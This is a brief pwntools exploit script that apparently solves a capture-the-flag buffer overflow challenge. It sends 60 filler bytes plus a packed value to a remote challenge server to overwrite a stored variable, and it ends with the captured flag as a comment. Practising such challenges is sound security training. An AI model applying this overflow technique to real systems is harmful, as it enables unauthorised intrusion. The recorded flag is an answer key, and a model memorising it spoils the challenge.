from pwn import *

#p = process('./buffer')
#elf = ELF('./buffer')
p = remote('chall.pwnoh.io', 13372)
res = p.recvuntil(':')
print(res)
offset = 60
payload = b'a' * offset + p64(0x45454545)
p.sendline(payload)

p.interactive()

#bctf{wHy_WriTe_OveR_mY_V@lUeS}
